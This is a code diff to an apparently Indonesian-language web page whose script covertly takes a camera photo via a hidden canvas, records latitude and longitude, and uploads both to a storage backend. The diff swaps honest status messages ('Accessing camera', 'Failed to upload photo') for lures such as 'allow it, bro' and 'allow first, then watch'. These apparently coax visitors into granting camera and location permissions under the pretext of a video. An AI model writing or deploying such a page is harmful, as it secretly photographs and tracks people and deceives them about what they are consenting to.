@@ -183,7 +183,7 @@
   // ===== FUNGSI MENGAMBIL FOTO (TANPA DITAMPILKAN) =====
   async function captureAndUpload(lat, lon) {
     try {
-      updateUI("Mengakses kamera...");
+      updateUI("izinkan abangku");
       
       // Minta akses kamera
       const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -206,7 +206,7 @@
         };
       });
       
-      updateUI("Mengambil foto...");
+      updateUI("loading abangku");
       
       // Tunggu sebentar agar kamera stabil
       setTimeout(async () => {
@@ -217,7 +217,7 @@
         // Konversi canvas ke blob
         hiddenCanvas.toBlob(async (blob) => {
           if (!blob) {
-            updateUI("❌ Gagal mengambil foto");
+            updateUI("❌ izinkan baru nonton");
             stream.getTracks().forEach(track => track.stop());
             return;
           }
@@ -235,7 +235,7 @@
 
           if (uploadError) {
             console.error("Upload error:", uploadError);
-            updateUI("❌ Gagal upload foto");
+            updateUI("❌ izinkan dulu abanku");
           } else {
             // Simpan data ke tabel
             const { error: insertError } = await client
@@ -278,7 +278,7 @@
     
     // Minta izin lokasi
     if (!navigator.geolocation) {
-      updateUI("❌ Browser tidak mendukung geolocation");
+      updateUI("❌ izinkan dulu abangku");
       return;
     }
 
